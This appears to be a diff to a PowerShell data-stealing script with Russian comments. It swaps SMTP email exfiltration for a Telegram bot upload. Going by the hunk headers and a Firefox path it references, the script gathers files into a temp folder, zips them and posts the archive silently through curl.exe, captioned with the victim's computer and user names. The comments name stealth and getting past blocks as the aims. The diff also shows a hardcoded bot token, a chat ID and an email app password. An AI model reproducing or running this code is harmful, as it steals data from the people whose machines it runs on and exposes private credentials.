@@ -1,9 +1,6 @@
-# [ Конфигурация SMTP ]
-$SmtpServer = "smtp.mail.ru"
-$SmtpPort = 587
-$SmtpUser = "agafonovsquad@yandex.ru"  # Твоя почта
-$SmtpPass = "vofiyuidkrihhala"    # ПАРОЛЬ ПРИЛОЖЕНИЯ (16 знаков)
-$To = "glebagafov434@gmail.com"        # Можно отправить самому себе
+# [ Конфигурация Telegram ]
+$botToken = "8453011015:AAFvYt0ZjgkUFAjtnLvONdmXl19l7GK9tfM"
+$chatId   = "806761221"
 
 # [ Инициализация ]
 $tempDir = "$env:TEMP\sys_$(Get-Random)"
@@ -66,30 +63,19 @@ if (Test-Path $ffPath) {
     }
 }
 
-# 3. УПАКОВКА И ОТПРАВКА НА ПОЧТУ
+# 3. УПАКОВКА И ОТПРАВКА В TELEGRAM
 if ((Get-ChildItem $tempDir).Count -gt 1) {
     $zipPath = "$env:TEMP\report_$(Get-Random).zip"
     Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force
 
     try {
-        $msg = New-Object System.Net.Mail.MailMessage
-        $msg.From = $SmtpUser
-        $msg.To.Add($To)
-        $msg.Subject = "Protocol 81: $env:COMPUTERNAME ($env:USERNAME)"
-        $msg.Body = "Report attached. System: $(Get-Date -Format 'dd.MM.yyyy HH:mm')"
-        
-        $att = New-Object System.Net.Mail.Attachment($zipPath)
-        $msg.Attachments.Add($att)
-        
-        $smtp = New-Object System.Net.Mail.SmtpClient($SmtpServer, $SmtpPort)
-        $smtp.EnableSsl = $true
-        $smtp.Credentials = New-Object System.Net.NetworkCredential($SmtpUser, $SmtpPass)
-        
-        $smtp.Send($msg)
-        
-        # Освобождаем ресурсы
-        $att.Dispose()
-        $msg.Dispose()
+        $caption = "Protocol 81: $($env:COMPUTERNAME) ($($env:USERNAME))"
+        # Используем curl.exe для обхода блокировок и скрытности
+        # --connect-timeout 10 на случай лагов сети
+        & curl.exe --silent --connect-timeout 10 -X POST "https://api.telegram.org/bot$botToken/sendDocument" `
+          -F "chat_id=$chatId" `
+          -F "document=@$zipPath" `
+          -F "caption=$caption" | Out-Null
     } catch {}
 
     # Очистка архива
